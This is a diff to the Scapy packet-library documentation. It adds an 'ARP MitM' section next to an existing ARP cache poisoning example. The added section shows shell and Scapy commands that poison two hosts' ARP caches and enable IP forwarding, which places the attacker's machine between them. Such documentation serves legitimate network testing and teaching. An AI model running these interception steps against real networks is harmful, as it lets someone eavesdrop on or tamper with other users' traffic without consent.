@@ -1421,6 +1421,18 @@ ARP cache poisoning with double 802.1q encapsulation::
           /ARP(op="who-has", psrc=gateway, pdst=client),
           inter=RandNum(10,40), loop=1 )
 
+ARP MitM
+--------
+This poisons the cache of 2 machines, then answers all following ARP requests to put the host between.
+Calling ctrl^C will restore the connection.
+
+::
+
+    $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface
+    $ sysctl net.ipv4.ip_forward=1
+    $ sudo scapy
+    >>> arp_mitm("192.168.122.156", "192.168.122.17")
+
 TCP Port Scanning 
 -----------------
  
